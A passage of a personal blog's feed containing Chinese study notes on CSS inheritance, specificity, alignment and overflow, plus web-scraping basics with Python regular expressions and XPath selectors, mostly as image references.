href="#2-常见继承的属性：" class="headerlink" title="2.常见继承的属性："></a>2.常见继承的属性：</h6><ol><li>color</li><li>font的四个属性</li><li>text-indent/text-align</li><li>line-height</li></ol><h6 id="2-继承失效特殊情况"><a href="#2-继承失效特殊情况" class="headerlink" title="2.继承失效特殊情况"></a>2.继承失效特殊情况</h6><p>如果元素有浏览器默认样式，此时继承性依然，但是优先显示浏览器的默认样式</p><ol><li>a标签的color会继承失效</li><li>h系列标签的font-size会继承失效，因为浏览器默认有设置h的font-size</li><li>div的高度不能继承，但是宽度有类似于继续效果</li></ol><h2 id="层叠性"><a href="#层叠性" class="headerlink" title="层叠性"></a>层叠性</h2><h6 id="1-特性"><a href="#1-特性" class="headerlink" title="1.特性"></a>1.特性</h6><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718221532615.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718221532615.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210718221532615"></p><h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><p>选择器只有在选择器相同是才能记性覆盖，如果选择器不同，那么则会优先使用<strong>优先选择的选择器</strong></p><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/88726C19-86E9-45BA-A244-EC749C29245C.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/88726C19-86E9-45BA-A244-EC749C29245C.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="88726C19-86E9-45BA-A244-EC749C29245C"></p><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/1D837310-5BEF-4433-BC40-BCE0363DAA04.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/1D837310-5BEF-4433-BC40-BCE0363DAA04.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1D837310-5BEF-4433-BC40-BCE0363DAA04"></p><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/91CA8535-53ED-4FD8-B5F7-6835C430474C.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/91CA8535-53ED-4FD8-B5F7-6835C430474C.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="91CA8535-53ED-4FD8-B5F7-6835C430474C"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>前端知识点</title>
      <link href="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/"/>
      <url>/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="垂直对齐方式（行内块元素的对齐方式）"><a href="#垂直对齐方式（行内块元素的对齐方式）" class="headerlink" title="垂直对齐方式（行内块元素的对齐方式）"></a>垂直对齐方式（行内块元素的对齐方式）</h1><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722200342156.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722200342156.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722200342156" style="zoom:67%;"><h6 id="1-文本框和按钮无法对齐的现象"><a href="#1-文本框和按钮无法对齐的现象" class="headerlink" title="1.文本框和按钮无法对齐的现象"></a>1.文本框和按钮无法对齐的现象</h6><p>行内块元素可以直接使用垂直对齐方式</p><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722200809884.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722200809884.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722200809884"></p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722202823323.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722202823323.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722202823323" style="zoom:67%;"><h6 id="2-input和img直接使用底部对齐即可"><a href="#2-input和img直接使用底部对齐即可" class="headerlink" title="2.input和img直接使用底部对齐即可"></a>2.input和img直接使用底部对齐即可</h6><h6 id="3-div中的文本框进行贴顶"><a href="#3-div中的文本框进行贴顶" class="headerlink" title="3.div中的文本框进行贴顶"></a>3.div中的文本框进行贴顶</h6><p><code>vertical-align：top;</code></p><h6 id="4-div不设高度由img标签撑开，此时img标签下面会存在额外的间隙问题"><a href="#4-div不设高度由img标签撑开，此时img标签下面会存在额外的间隙问题" class="headerlink" title="4.div不设高度由img标签撑开，此时img标签下面会存在额外的间隙问题"></a>4.div不设高度由img标签撑开，此时img标签下面会存在额外的间隙问题</h6><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203245565.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203245565.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722203245565" style="zoom:67%;"><p>解决方法两种：</p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203415864.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203415864.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722203415864" style="zoom:67%;"><h6 id="5-使用line-height设置成垂直居中"><a href="#5-使用line-height设置成垂直居中" class="headerlink" title="5.使用line-height设置成垂直居中"></a>5.使用line-height设置成垂直居中</h6><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203605633.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203605633.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722203605633" style="zoom:50%;"><h1 id="光标类型"><a href="#光标类型" class="headerlink" title="光标类型"></a>光标类型</h1><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203703243.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203703243.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722203703243" style="zoom:67%;"><h1 id="边框圆角"><a href="#边框圆角" class="headerlink" title="边框圆角"></a>边框圆角</h1><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203908861.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722203908861.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722203908861"></p><h6 id="1-画一个正圆"><a href="#1-画一个正圆" class="headerlink" title="1.画一个正圆"></a>1.画一个正圆</h6><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214442206.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214442206.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722214442206" style="zoom:50%;"><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214502862.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214502862.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722214502862"><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214442206.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214442206.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722214442206" style="zoom:50%;"><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214502862.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214502862.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722214502862"></p><h6 id="2-胶囊按钮"><a href="#2-胶囊按钮" class="headerlink" title="2.胶囊按钮"></a>2.胶囊按钮</h6><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214725250.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214725250.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722214725250" style="zoom:50%;"><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214735268.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214735268.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722214735268" style="zoom:50%;"></p><h1 id="overflow溢出部分显示效果"><a href="#overflow溢出部分显示效果" class="headerlink" title="overflow溢出部分显示效果"></a>overflow溢出部分显示效果</h1><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214927638.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214927638.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722214927638" style="zoom:50%;"><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214944248.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722214944248.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722214944248" style="zoom:67%;"></p><h1 id="元素本身隐藏"><a href="#元素本身隐藏" class="headerlink" title="元素本身隐藏"></a>元素本身隐藏</h1><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722215312624.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722215312624.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722215312624" style="zoom:50%;"><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722215357197.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E8%A3%85%E9%A5%B0/image-20210722215357197.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722215357197" style="zoom:50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>爬虫注意</title>
      <link href="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/"/>
      <url>/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/</url>
      
        <content type="html"><![CDATA[<p>正则表达式匹配</p><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210710222616310.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210710222616310.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210710222616310"></p><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711093655626.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711093655626.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711093655626"></p><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711120559122.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711120559122.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711120559122"></p><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711121751310.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711121751310.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711121751310"></p><p>​     ！表示不要后面的结果 </p><p>​        匹配结果输入group( )和group(1)会有所不同，前者会输出所有完整的匹配结果，后者会输出第一个被( )匹配的结果</p><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711123136049.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711123136049.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711123136049"></p><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="mathch"><a href="#mathch" class="headerlink" title="mathch()"></a>mathch()</h2><p>从头开始匹配，一旦头部不匹配，整个匹配失败</p><h2 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h2><p>匹配时扫描整个字符串，返回第一个匹配结果</p><h2 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h2><p>搜索整个字符串，返回匹配正则表达式的所有内容</p><h2 id="sub"><a href="#sub" class="headerlink" title="sub()"></a>sub()</h2><p>通过正则表达式将文本里的内容全部去掉，第一个参数为正则表达式，第二个参数为替换成为的内容，第三个为原字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&quot;hsdkjahkj123131jjhashdkj&quot;</span></span><br><span class="line">res=re.sub(<span class="string">&quot;\d&quot;</span>,<span class="string">&quot;&quot;</span>,url)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711124114801.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711124114801.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711124114801"></p><h2 id="正则表达式练习题"><a href="#正则表达式练习题" class="headerlink" title="正则表达式练习题"></a>正则表达式练习题</h2><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711150345570.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711150345570.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711150345570" style="zoom:50%;"><p>\1表示 .*==(…)</p><h1 id="XPATH"><a href="#XPATH" class="headerlink" title="XPATH"></a>XPATH</h1><h2 id="XPATH常用规则"><a href="#XPATH常用规则" class="headerlink" title="XPATH常用规则"></a>XPATH常用规则</h2><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711153143688.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711153143688.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711153143688"></p><h2 id="属性匹配"><a href="#属性匹配" class="headerlink" title="属性匹配"></a>属性匹配</h2><p>用@符号进行过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//li[@class=&quot;hello&quot;]</span><br></pre></td></tr></table></figure><p>其中过滤出所有class是hello的节点</p><p>如果要匹配是否有存在应该使用cantain函数，同时该函数可以用来匹配多个属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//li[contains(@class,&quot;li&quot;)]/a/text()</span><br><span class="line">//li[contains(@class,&quot;li&quot;) and @name=&quot;item&quot;]/a/text()</span><br></pre></td></tr></table></figure><h2 id="文本获取"><a href="#文本获取" class="headerlink" title="文本获取"></a>文本获取</h2><p>使用text( )方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.xpath(<span class="string">&#x27;//li[@class=&quot;item-0&quot;]/a/text()&#x27;</span>)</span><br></pre></td></tr></table></figure><p>其中获取的的是li标签下所有a的值</p><h2 id="属性获取"><a href="#属性获取" class="headerlink" title="属性获取"></a>属性获取</h2><p>通过@来获取节点的属性，与属性匹配不同，属性匹配使用<strong>中括号加属性名和值</strong>来限定某个属性，如<code>[@href=&quot;link1.html&quot;]</code>，而此处的@herf指的是获取节点的某个属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.xpath(<span class="string">&#x27;//li/a/@href&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711155919269.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711155919269.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210711155919269" style="zoom:67%;"><h2 id="选择：按序选择和节点轴选择"><a href="#选择：按序选择和节点轴选择" class="headerlink" title="选择：按序选择和节点轴选择"></a>选择：按序选择和节点轴选择</h2><p><img src="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711160101787.png" class="lazyload" data-srcset="/2021/07/10/%E7%88%AC%E8%99%AB%E6%B3%A8%E6%84%8F/image-20210711160101787.png" 